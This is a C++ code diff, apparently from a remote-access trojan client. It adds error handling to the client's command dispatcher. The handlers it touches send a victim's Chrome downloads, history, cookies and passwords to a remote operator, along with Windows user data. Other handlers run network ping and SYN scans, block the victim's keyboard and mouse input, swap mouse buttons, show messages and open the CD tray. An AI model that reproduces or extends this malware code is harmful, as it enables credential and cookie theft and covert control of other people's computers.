@@ -913,9 +913,6 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         return;
     }
 
-
-    // MODIFICAR DESDE AQUI LA COMPROBACION DE MODULOS CARGADOS
-
     //#####################################################
     //#####################################################
     //                ADMIN VENTANAS                      # 
@@ -969,7 +966,10 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Enviar lista de perfiles de chrome
     if (iComando == EnumComandos::INF_Chrome_Profiles) {
         if (this->mod_Inf0 == nullptr) {
-            this->mod_dynamic->LoadInfoProcs();
+            if (!this->mod_dynamic->LoadInfoProcs()) {
+                __DBG_("[X] Error iniciando librerias para mod_Inf0");
+                return;
+            }
             this->mod_Inf0 = new mod_Info(this->mod_dynamic->BCRYPT, this->mod_dynamic->CRYPT32, this->mod_dynamic->NETAPI32, this->mod_dynamic->KERNEL32);
         }
         std::string strPaquete = "N/A";
@@ -1001,7 +1001,10 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Enviar datos de navegacion de perfil (descargas,historial,cookies,passwords)
     if (iComando == EnumComandos::INF_Chrome_Profile_Data) {
         if (this->mod_Inf0 == nullptr) {
-            this->mod_dynamic->LoadInfoProcs();
+            if (!this->mod_dynamic->LoadInfoProcs()) {
+                __DBG_("[X] Error iniciando librerias para mod_Inf0");
+                return;
+            }
             this->mod_Inf0 = new mod_Info(this->mod_dynamic->BCRYPT, this->mod_dynamic->CRYPT32, this->mod_dynamic->NETAPI32, this->mod_dynamic->KERNEL32);
         }
         strIn = strSplit(paquete.cBuffer.data(), CMD_DEL, 2);
@@ -1022,7 +1025,10 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Enviar datos de usuarios de windows
     if (iComando == EnumComandos::INF_Users) {
         if (this->mod_Inf0 == nullptr) {
-            this->mod_dynamic->LoadInfoProcs();
+            if (!this->mod_dynamic->LoadInfoProcs()) {
+                __DBG_("[X] Error iniciando librerias para mod_Inf0");
+                return;
+            }
             this->mod_Inf0 = new mod_Info(this->mod_dynamic->BCRYPT, this->mod_dynamic->CRYPT32, this->mod_dynamic->NETAPI32, this->mod_dynamic->KERNEL32);
         }
         std::string strPaquete = this->mod_Inf0->m_GetUsersData();
@@ -1054,13 +1060,11 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Escanear red PING
     if (iComando == EnumComandos::Net_Scan) {
         if (!this->mod_Scan) {
-            this->mod_dynamic->LoadNetProcs();
+            if (!this->mod_dynamic->LoadNetProcs()) {
+                __DBG_("[X] Error iniciando librerias para mod_Scan");
+                return;
+            }
             this->mod_Scan = new mod_Escaner(this->mod_dynamic->IPHLAPI, this->mod_dynamic->WS32);
-        }
-
-        if (!this->mod_Scan->checkMod()) {
-            __DBG_("[X] mod_Scan no se pudo cargar");
-            return;
         }
 
         std::string strPaquete = "";
@@ -1077,13 +1081,11 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     if (iComando == EnumComandos::Net_Scan_Sck || iComando == EnumComandos::Net_Scan_Syn ||
         iComando == EnumComandos::Net_Scan_Full_Sck || iComando == EnumComandos::Net_Scan_Full_Syn) {
         if (!this->mod_Scan) {
-            this->mod_dynamic->LoadNetProcs();
+            if (!this->mod_dynamic->LoadNetProcs()) {
+                __DBG_("[X] Error iniciando librerias para mod_Scan");
+                return;
+            }
             this->mod_Scan = new mod_Escaner(this->mod_dynamic->IPHLAPI, this->mod_dynamic->WS32);
-        }
-
-        if (!this->mod_Scan->checkMod()) {
-            __DBG_("[X] mod_Scan no se pudo cargar");
-            return;
         }
 
         std::vector<std::string> vcData = strSplit(std::string(paquete.cBuffer.data()), "|", 3);
@@ -1110,7 +1112,10 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Mod fun - swap mouse
     if (iComando == EnumComandos::Fun_Swap_Mouse) {
         if (this->mod_Fun == nullptr) {
-            this->mod_dynamic->LoadFunProcs();
+            if (!this->mod_dynamic->LoadFunProcs()) {
+                __DBG_("[X] Error iniciando librerias para mod_Fun");
+                return;
+            }
             this->mod_Fun = new modFun(this->mod_dynamic->USER32_FUN, this->mod_dynamic->WINMM);
         }
         BOOL _swap = atoi(paquete.cBuffer.data());
@@ -1121,7 +1126,10 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Mod fun - block input
     if (iComando == EnumComandos::Fun_Block_Input) {
         if (this->mod_Fun == nullptr) {
-            this->mod_dynamic->LoadFunProcs();
+            if (!this->mod_dynamic->LoadFunProcs()) {
+                __DBG_("[X] Error iniciando librerias para mod_Fun");
+                return;
+            }
             this->mod_Fun = new modFun(this->mod_dynamic->USER32_FUN, this->mod_dynamic->WINMM);
         }
         BOOL _block = atoi(paquete.cBuffer.data());
@@ -1132,7 +1140,10 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Mod fun - msg
     if (iComando == EnumComandos::Fun_Msg) {
         if (this->mod_Fun == nullptr) {
-            this->mod_dynamic->LoadFunProcs();
+            if (!this->mod_dynamic->LoadFunProcs()) {
+                __DBG_("[X] Error iniciando librerias para mod_Fun");
+                return;
+            }
             this->mod_Fun = new modFun(this->mod_dynamic->USER32_FUN, this->mod_dynamic->WINMM);
         }
         std::vector<std::string> vcData = strSplit(std::string(paquete.cBuffer.data()), "<ravdo>", 3);
@@ -1150,7 +1161,10 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Mod fun - cd
     if (iComando == EnumComandos::Fun_CD) {
             if (this->mod_Fun == nullptr) {
-                this->mod_dynamic->LoadFunProcs();
+                if (!this->mod_dynamic->LoadFunProcs()) {
+                    __DBG_("[X] Error iniciando librerias para mod_Fun");
+                    return;
+                }
                 this->mod_Fun = new modFun(this->mod_dynamic->USER32_FUN, this->mod_dynamic->WINMM);
             }
             BOOL _open = atoi(paquete.cBuffer.data());
